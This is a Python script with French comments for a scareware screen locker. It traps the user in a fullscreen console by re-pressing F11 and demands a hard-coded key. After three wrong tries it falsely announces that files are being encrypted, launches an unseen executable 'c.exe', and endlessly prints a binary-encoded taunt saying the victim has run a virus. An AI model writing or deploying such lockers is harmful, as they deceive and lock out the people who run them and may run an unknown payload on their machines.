# encoding UTF-8
from colored import fg, attr, bg
import os, time, pyautogui, threading, keyboard

# Var
running = True
response = "azerty"
wait_until_block = 0
is_crypting = False

# Paramètres du cmd
os.system("@echo off")
os.system("title Password")
os.system("cls")
pyautogui.press("F11")


def WaitF11(): # Fonction pour bloquer la fenêtre en plein écran

    global running
    
    while running:
        keyboard.wait("F11") # Attendre que la personne appuie sur F11 (ça fonctionne comme un time.sleep mais avec une condition à la place d'un temps d'attente)
        pyautogui.press("F11") # Lorsque elle appuie alors on réappuie sur la touche (avec pyautogui prcq quand on le fait avec keyboard ça spam) 
        

def SetBackgroundColor(): # Fonction pour bloquer la couleur de l'arrière-plan
    
    global running
    global is_crypting
    
    while running and not is_crypting:
        os.system("color 4a")
        time.sleep(0.1)
    while is_crypting:
        os.system("color a")
        time.sleep(0.1)

# Fonction principale
def Main():
    
    global wait_until_block # Rendre la variable globale (pour pouvoir la modifier depuis la fonction)
    global running
    global is_crypting
    
    while running: 
        os.system("cls")
        
        user_response = input(f"{fg(0)}{bg(1)}Entrez votre clé ici: \n{attr(0)}") # L'utilisateur entre la clé

        if user_response == response: # Si la valeur entrée est correcte
            print(f"{fg(2)}{bg(1)}Clé valide{attr(0)}")
            print(f"{fg(0)}{bg(1)}Appuyez sur F11 pour quitter.{attr(0)}")
            running = False # Quitter le programme

        else: # Clé invalide
            print(f"{fg(88)}{bg(1)}Clé invalide{attr(0)}")
            wait_until_block += 1
            time.sleep(0.5)
            if wait_until_block >= 3: # Si l'utilisateur entre une clé invalide 3 fois ou +
                # Cryptage de fichier et autres
                print("Nombres d'erreurs max dépassés.")
                time.sleep(1)
                print("CRYPTAGE DES FICHIERS EN COURS")
                time.sleep(1)
                os.system("start c.exe")
                is_crypting = True
                while True:
                    os.system("echo 01001100 01101111 01101100 00100000 01110100 00100111 01100001 01110011 00100000 01101100 01100001 01101110 01100011 11000011 10101001 00100000 01110101 01101110 00100000 01110110 01101001 01110010 01110101 01110011 00100000 01110011 01110101 01110010 00100000 01110100 01101111 01101110 00100000 01101111 01110010 01100100 01101001 01101110 01100001 01110100 01100101 01110101 01110010 00100000 01110011 01100001 01101100 01100101 00100000 01101110 01101111 01101111 01100010 00101100 00100000 01110100 01101111 01101110 00100000 01110000 01100011 00100000 01110110 01100001 00100000 01100010 01110010 11000011 10111011 01101100 01100101 01110010 00100000 01101101 01100100 01110010 00100000 00100001 00100001")
# Threads
main = threading.Thread(target=Main)
wait_f11 = threading.Thread(target=WaitF11)
set_background_color = threading.Thread(target=SetBackgroundColor)

# Liste des threads
threads = [set_background_color, main, wait_f11]

# Lancer les threads un par un
for thread in threads: thread.start()
for thread in threads: thread.join()